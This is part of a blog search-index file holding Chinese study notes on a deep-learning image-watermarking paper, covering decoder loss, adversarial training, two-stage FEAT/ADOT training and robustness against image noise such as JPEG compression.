+<h3 id="解码器D"><a href="#解码器D" class="headerlink" title="解码器D"></a>解码器D</h3><p>对于水印图片，解码器输出的M’的分布应该更接近（1，-1）。而对于没有水印的图片，输出的分布更接近0。所以我们用（-1，1）代替（0，1）。</p>
+<p>对比：</p>
+<ul>
+<li>M为0，0，1，1，M’为0，0，0，0。那么有均方误差为2</li>
+<li>M为-1，-1，1，1，M’为0，0，0，0。那么均方误差为4</li>
+</ul>
+<p>这样损失函数更能比较解码器的性能：</p>
+<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/5.png" class="">
+
+<h3 id="对手A"><a href="#对手A" class="headerlink" title="对手A"></a>对手A</h3><p>在对手网络对抗中，编码器不断更新θE，来试图欺骗对手，使得对手无法判断Ico和Ien。对于A，则不断更新θA来对Ico和Ien进行二分类。</p>
+<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/6.png" class="">
+
+<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/7.png" class="">
+
+<h2 id="两阶段可分离式训练"><a href="#两阶段可分离式训练" class="headerlink" title="两阶段可分离式训练"></a>两阶段可分离式训练</h2><p>阶段一：无噪声端到端对手训练（FEAT），目的是最小化：</p>
+<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/8.png" class="">
+
+<p>阶段二：噪声感知解码器（ADOT）训练。目标是最小化：</p>
+<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/5.png" class="">
+
+<p>第一阶段的训练对第二阶段的训练能起到加速作用。</p>
+<h3 id="传统噪声攻击"><a href="#传统噪声攻击" class="headerlink" title="传统噪声攻击"></a>传统噪声攻击</h3><ol>
+<li>Resize噪声，将图片缩小为原先的p倍再放大回原先尺寸</li>
+<li>椒盐噪声(salt-and-pepper noise)是指两种噪声，一种是盐噪声（salt noise），另一种是胡椒噪声（pepper  noise）。盐=白色(0)，椒=黑色(255)。前者是高灰度噪声，后者属于低灰度噪声。一般两种噪声同时出现，呈现在图像上就是黑白杂点。</li>
+<li>高斯噪声，指噪声的概率密度函数服从高斯分布</li>
+<li>JPEG压缩</li>
+</ol>
+<h3 id="黑盒噪声攻击"><a href="#黑盒噪声攻击" class="headerlink" title="黑盒噪声攻击"></a>黑盒噪声攻击</h3><p>日常生活中常见的图像处理软件引起的噪声攻击，我们称之为黑盒噪声。这种图像处理算法封装在软件中，总是集成了各种改变整个图像像素的传统噪声，</p>
+<h3 id="指定训练和组合训练"><a href="#指定训练和组合训练" class="headerlink" title="指定训练和组合训练"></a>指定训练和组合训练</h3><p>指定训练：在单个噪声下进行ADOT训练</p>
+<p>组合训练：在各种噪声下进行ADOT训练</p>
+<h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/9.png" class="">
+
+<p>Pretrained 表示第一阶段无噪声下，解码器的准确率</p>
+<p>Specified 表示指定噪声训练下，指定解码器的准确率</p>
+<p>Combined 表示在该噪声下，组合解码器的准确率</p>
+]]></content>
   </entry>
 </search>
